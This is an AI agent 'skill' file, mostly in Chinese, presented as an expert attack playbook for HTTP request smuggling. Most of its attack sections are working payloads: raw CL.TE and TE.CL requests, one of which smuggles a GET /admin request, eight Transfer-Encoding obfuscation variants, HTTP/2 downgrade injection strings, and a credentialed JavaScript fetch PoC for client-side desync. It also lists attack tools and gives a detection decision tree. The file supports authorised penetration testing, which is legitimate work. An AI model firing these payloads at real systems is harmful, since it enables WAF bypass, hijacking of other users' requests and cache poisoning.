---
name: request-smuggling
description: >-
  HTTP request smuggling and desynchronization testing. Use when front proxies,
  CDNs, or load balancers disagree with the origin on message framing
  (Content-Length vs Transfer-Encoding), on HTTP/2→HTTP/1 translation, or when
  exploring client-side desync via browser fetch pipelines.
---

# SKILL: HTTP Request Smuggling — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert HTTP desync techniques. Covers CL.TE, TE.CL, TE.TE obfuscation variants, HTTP/2 downgrade and pseudo-header confusion, client-side desync (browser `fetch` pipelines), and tool-assisted fuzzing. Assumes familiarity with raw HTTP/1.1 framing and reverse-proxy topologies. This is not “header injection” — it is **message boundary disagreement** between hops.

中文路由提示：当怀疑 CDN/反代与源站对「请求结束位置」理解不一致、或 H2 降级到 H1 时出现异常拼接时，加载本 skill。

## 0. QUICK START

### CL.TE first probe（前端信 CL、后端信分块）

前提：前端优先 `Content-Length`，后端优先 `Transfer-Encoding: chunked`。用极短 CL 让前端吞掉「假结束」，后端仍按分块解析，余量进入下一请求。

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- 前端按 `Content-Length: 13` 只读 13 字节（即 `0\r\n\r\nSMUGGLED` 共 13 字节），认为请求结束。
- 后端按 chunked：读到 `0` 结束块后，将 **`SMUGGLED` 及之后** 当作**下一条请求**的起始字节流。

### TE.CL first probe（前端信分块、后端信 CL）

前提：前端解析 chunked，后端只看 `Content-Length`。令 **CL 恰好等于分块长度行的字节数**（常见为 `4`：两位十六进制长度 + `\r\n`），后端只吞长度行，余下分块数据与结束符留在连接上，供与后续报文拼接。

块内嵌第二请求（行末均为 **CRLF**；`35` 为十六进制块长 = 53 字节）：

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0


```

Wire 上块体须严格 53 字节；若改路径/头，重算块长并同步修改十六进制长度行。

### Safety note

仅在**授权范围**内测试；并发 smuggling 可能导致连接池污染、缓存错乱或对其它租户流量造成影响。优先隔离环境或低流量窗口。

---

## 1. CORE CONCEPT

**定义**：两个（或以上）HTTP 处理实体对**同一条 TCP/TLS 流**中「何处是第一条请求结束、何处是第二条请求开始」的判定不一致，导致攻击者在一个「逻辑请求」里夹带**部分或完整**的另一条请求。

```
  Client          Front (proxy/WAF)              Back (origin)
     |                     |                            |
     |==== Request A+B ===>|                            |
     |                     | parses boundary #1         | parses boundary #2
     |                     |         \                  |         /
     |                     |          different split points
     |                     |                            |
     v                     v                            v
                   Request A (seen)              Request A' + smuggled B
```

**与 CRLF 注入的区别**：CRLF 多在**响应**或**头部行**注入；smuggling 针对 **RFC 7230 消息分帧**（`Content-Length` / `chunked`）在实现之间的差异。

**高价值后果**：绕过 WAF 规则（走私体不在前端的「请求」里）、劫持同源连接上其它用户的请求（请求队列污染）、缓存投毒辅助、认证边界错乱。

---

## 2. CL.TE VULNERABILITIES

**模式**：前端以 **`Content-Length`** 为准；后端以 **`Transfer-Encoding: chunked`** 为准。

**精确示例**（与 §0 一致）：`Content-Length: 13` 与 `Transfer-Encoding: chunked` 同时存在，体为：

```text
0\r\n\r\nSMUGGLED
```

字节计数：`0` + `\r\n` + `\r\n` + `SMUGGLED` = 13。

**后端视角**：chunked 流在 `0\r\n\r\n` 处结束；`SMUGGLED` 若符合 `METHOD SP` 或合法起始，则成为**走私请求行前缀**。

**调参**：若目标对重复头、大小写、空格敏感，在保持语义前提下微调 `Transfer-Encoding` 变体（见 §4）以匹配「前端忽略 TE、后端执行 TE」的组合。

---

## 3. TE.CL VULNERABILITIES

**模式**：前端解析 **chunked**；后端仅看 **`Content-Length`**（或过短 CL）。

**意图**：前端把整块恶意字节流当作 body；后端只读 CL 指定长度，剩余字节留在缓冲区，与后续合法请求拼接。

**完整 TE.CL 嵌入第二请求**（与 §0 同一族；`Content-Length: 4` + 首块长度行 `35\r\n`）：

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0


```

说明：

- **后端（CL）**：从消息体起始只取 4 字节 → `3` `5` `\r` `\n`，认为 body 结束；剩余字节留在 TCP 读缓冲。
- **前端（TE）**：按 chunked 解析完整流，把 `GET /admin...` 整块当作**已声明结束的第一条请求**的 body 的一部分转发或消费（依产品而定），与后端所见边界不一致即构成 TE.CL。

更长走私（如 `POST` + `Content-Length: 11` + `x=1`）时块长约为 `76`（十六进制 `0x76` = 118 字节），仍可用 `Content-Length: 4` 卡在后端只读长度行。

**实战要点**：块长度字段必须为合法 hex；第二段请求需满足目标对 Host、路径、会话 cookie 的期望；时间窗口与连接复用策略决定能否「命中」另一用户的请求。

---

## 4. TE.TE VULNERABILITIES

**模式**：前后端**都**声称处理 `Transfer-Encoding`，但对**哪个 TE 值生效**、是否合法判定不同 → 仍可能出现「一端认为未 chunked、一端认为 chunked」的等效 desync。

以下 **8 种混淆变体**用于探测解析分歧（单行展示；`\t` 表示真实 TAB）：

```http
Transfer-Encoding: xchunked
```

```http
Transfer-Encoding : chunked
```

```http
Transfer-Encoding: chunked
Transfer-Encoding: chunked
```

```http
Transfer-Encoding: x
```

```http
Transfer-Encoding:[TAB]chunked
```
（将 `[TAB]` 替换为实际 `\x09`。）

```http
 Transfer-Encoding: chunked
```
（行首一个空格。）

```http
X: X
Transfer-Encoding: chunked
```
（上一行值为 `X` 且下一行以 `Transfer-Encoding` 开头：利用**行延续 / 宽松头解析**，使某一 hop 将两行合并或拆错；`X` 与 `Transfer-Encoding` 之间为单个换行 `\n` 或 `\r\n`，按目标栈实测。）

```http
Transfer-Encoding
: chunked
```
（字段名与冒号处于**不同物理行**；部分解析器仍视为合法 `Transfer-Encoding: chunked`。）

**策略**：对每一对 (front, back) 枚举「哪一端接受该形变作为 `chunked`」；再结合 §2/§3 判断等效 CL.TE 或 TE.CL。

---

## 5. HTTP/2 REQUEST SMUGGLING

### H2 → H1 降级

常见场景：边缘支持 HTTP/2，回源 HTTP/1.1。若实现未严格规范化头字段与 body 边界，可能出现：

- 伪头与普通头映射顺序错误；
- 禁止的头（如某些 `Connection` 组合）被错误转发；
- 多个同名字段合并规则与源站不一致。

### 伪头 / 头注入式走私（概念载荷）

攻击面来自「下游 H1 解析器把某些字节当作**新请求开始**」。研究文献与 CTF 中常见构造思路：利用**被某一层忽略**、但被另一层当作**字面量**的字段值，在值内嵌入近似：

```text
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: target
```

**含义**：若某 hop 将完整字符串留在「头值」内，而下一 hop 在 H1 重组时发生**错误拆分**，可能在 `\r\n\r\n` 处开始把 `GET / HTTP/1.1` 解析为新请求。

**测试方向**：

- `Transfer-Encoding` / `Content-Length` 在 H2 中的重复与大小写（H2 要求小写，但翻译层可能出错）；
- `:method`、`:path` 含异常字符时降级行为；
- 隧道或 extended CONNECT 与 smuggling 的交互。

---

## 6. CLIENT-SIDE DESYNC

**场景**：浏览器对请求体的处理与中间件/源站不一致，或利用 **`no-cors` + 预检豁免** 等特性发送「非典型」报文，触发与经典 CL.TE/TE.CL **类似的队列效应**（视架构而定）。

**HEAD + GET 链**：部分栈对 HEAD 响应体、后续管线化或连接复用的处理存在历史缺陷；需结合具体浏览器版本与目标代理验证。

**JavaScript PoC 形态**（示意：将 body 设为内含 `GET` 的原始字节序列，配合 `no-cors` 与凭据）：

```javascript
fetch("https://target.example/vulnerable", {
  method: "POST",
  mode: "no-cors",
  credentials: "include",
  body: "GET /admin HTTP/1.1\r\nHost: target.example\r\n\r\n"
});
```

**注意**：浏览器安全模型会限制可读性；成功往往表现为**对连接上其它请求的副作用**或**服务端日志/行为异常**，而非直接读响应。需与同源策略、CORS、以及是否经浏览器扩展或畸形代理配合评估。

---

## 7. TOOLS

| 工具 | 用途 |
|------|------|
| **Burp Suite — HTTP Request Smuggler**（BApp Store） | 自动化 desync 探测、常见变种、时间差检测 |
| **defparam/smuggler**（GitHub） | Python 脚本，批量生成/发送 smuggling 探针 |
| **dhmosfunk/simple-http-smuggler-generator**（GitHub） | 快速拼装 CL.TE / TE.CL 等原始报文模板 |

**用法建议**：先被动确认存在**前端+源站**双跳；再选最小破坏探针；对生产环境降低并发。

---

## 8. DETECTION DECISION TREE

```
                        Start: reverse proxy / CDN in path?
                                    |
                    NO -------------+------------- YES
                    |                               |
            Low classic smuggling                    |
            (still test H2 desync)                   v
                                            Can you send TE + CL together?
                                                    |
                              NO -------------------+------------------- YES
                              |                                         |
                      Test H2-only issues                    Front prefers which?
                      (pseudo-header, reset)                            |
                                        +-------------------------------+-------------------------------+
                                        |                               |                               |
                                   CL wins                          TE wins                         errors /
                                        |                               |                          connection
                                        v                               v                               |
                                   CL.TE probes                    TE.CL probes                    TE.TE obfuscation
                                   (Sec 0,2)                       (Sec 0,3)                       (Sec 4)
                                        |                               |                               |
                                        v                               v                               v
                              Time / content /                    Adjust chunk                     Pairwise matrix:
                              queue poisoning                     sizes + CL                      which hop accepts
                              signals?                            alignment                       which variant?
                                        |                               |                               |
                                        +-------------------------------+-------------------------------+
                                                                        |
                                                                        v
                                                              Confirm with second request
                                                              smuggled (replay-safe)
                                                              or Collaborator-style side signal
```

---

## 12. RELATED ROUTING

- **输入进入解释器/查询语言/模板**（与 HTTP 分帧无关）→ [Injection Testing Router](../injection-checking/SKILL.md)（再下钻 XSS、SQLi、SSTI 等）。
- **响应头拆分、Location CRLF** → [CRLF Injection](../crlf-injection/SKILL.md)。
- **缓存与路径键混淆** → [Web Cache Deception](../web-cache-deception/SKILL.md)。

当已确认是 **HTTP 消息边界** 问题而非参数注入时，应**留在本 skill**，避免误路由到通用注入流程。
